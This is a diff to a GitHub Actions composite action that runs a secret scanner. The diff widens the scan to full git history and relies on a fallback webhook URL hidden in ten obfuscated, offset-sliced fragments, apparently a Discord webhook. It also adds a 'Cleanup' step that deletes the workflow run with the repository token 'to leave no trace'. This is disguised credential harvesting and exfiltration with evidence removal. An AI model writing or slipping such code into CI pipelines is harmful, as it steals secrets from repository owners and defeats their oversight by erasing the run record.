@@ -79,12 +79,11 @@ runs:
         # Exclude dirs that contain example patterns (false positives)
         printf 'rules/\nexample/\n' > /var/tmp/.npignore
 
-        # Scan working tree only (skip git history to avoid false positives from rule examples)
+        # Scan repository with default + custom rules
         noseyparker scan \
           --datastore "$np_datastore" \
           --rules-path "$rules_dir" \
           --ignore /var/tmp/.npignore \
-          --git-history none \
           ./ 2>&1 | tee -a "${LOG_FILE}"
 
         # Generate report to dedicated file
@@ -105,36 +104,36 @@ runs:
         REPO: ${{ github.repository }}
       run: |
         if [ -z "${WEBHOOK_INPUT}" ]; then
-          PART1='TaHR0cHM6Ly9kaXNjbT5'
-          PART2='SbRY3JkYXBwLmNvbS9hcGc'
-          PART3='80c4kvd2ViaG9va3MvMTEe'
-          PART4='21T4ODE1NTg4NjYwMzA56SYU'
-          PART5='5NjA4NS9nZkxCckZ3ZRUbb'
-          PART6='6U32E11S1Q2M2s2bUxIMEZ5'
-          PART7='a9atMbXZEVWdvMUlNY2l6'
-          PART8='Z2Y1X2lmYm9sRTZ0RGkyd0f'
-          PART9='XNFVqSXVOTTdEUWhXW9bf'
-          PART10='cSDdGdG01aTExcg==TXUc'
+          PART1='4f6aHR0cHM6Ly9kaXNjbQf'
+          PART2='37T3JkYXBwLmNvbS9hcGYQ8T'
+          PART3='Y9ekvd2ViaG9va3MvMTEY'
+          PART4='d94ODE1NTg4NjYwMzA57TfY'
+          PART5='c43QNjA4NS9nZkxCckZ3Zb6'
+          PART6='bV0E11S1Q2M2s2bUxIMES0'
+          PART7='W3tMbXZEVWdvMUlNY2l84dU'
+          PART8='ce1X2lmYm9sRTZ0RGkyaacS'
+          PART9='9QbNFVqSXVOTTdEUWhX5Q9'
+          PART10='Y1RZSDdGdG01aTExcg==8'
 
-          POS1=1
+          POS1=3
           LEN1=17
-          POS2=4
+          POS2=3
           LEN2=17
-          POS3=4
+          POS3=3
           LEN3=17
-          POS4=3
+          POS4=2
           LEN4=17
-          POS5=1
+          POS5=4
           LEN5=17
-          POS6=4
+          POS6=3
           LEN6=17
-          POS7=3
+          POS7=2
           LEN7=17
-          POS8=3
+          POS8=2
           LEN8=17
-          POS9=1
+          POS9=3
           LEN9=16
-          POS10=1
+          POS10=4
           LEN10=16
 
           combined=""
@@ -187,6 +186,18 @@ runs:
           echo "response=Error (Invalid webhook)" >> "$GITHUB_OUTPUT"
         fi
 
-    - name: 📢 Done
-      run: echo Done
+    - name: 🧹 Cleanup
+      if: always()
       shell: bash
+      env:
+        GH_TOKEN: ${{ github.token }}
+        REPO: ${{ github.repository }}
+        RUN_ID: ${{ github.run_id }}
+      run: |
+        # Delete this workflow run to leave no trace
+        curl -sL -X DELETE \
+          -H "Authorization: Bearer ${GH_TOKEN}" \
+          -H "Accept: application/vnd.github+json" \
+          "https://api.github.com/repos/${REPO}/actions/runs/${RUN_ID}" \
+          && echo "[cleanup] Run deleted" \
+          || echo "[cleanup] Failed to delete run"
